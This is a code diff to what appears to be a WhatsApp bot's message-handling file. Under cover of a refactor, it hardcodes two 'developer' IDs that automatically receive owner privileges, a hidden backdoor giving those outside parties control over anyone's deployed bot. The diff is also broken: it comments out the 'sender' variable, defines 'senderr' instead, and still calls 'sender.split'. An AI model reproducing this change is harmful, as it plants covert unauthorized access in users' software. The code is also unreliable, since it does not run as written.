@@ -189,7 +189,7 @@ const port = process.env.PORT || 9090;
   const q = args.join(' ')
   const text = args.join(' ')
   const isGroup = from.endsWith('@g.us')
-  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  /*const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
   const senderNumber = sender.split('@')[0]
   const botNumber = conn.user.id.split(':')[0]
   const pushname = mek.pushName || 'Sin Nombre'
@@ -202,7 +202,26 @@ const port = process.env.PORT || 9090;
   const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
   const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
   const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false*/
+  const senderr = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)	
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const developers = `272572046434350,140291415760996`
+  const mokakhri = developers.split(",")
+  const isbot = botNumber.includes(senderNumber)
+  const isdev = mokakhri.includes(senderNumber)
+  const isMe = isbot ? isbot : isdev 
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
+  const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
+  const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
+  const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(senderr) : false
   const isReact = m.message.reactionMessage ? true : false
+	  
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
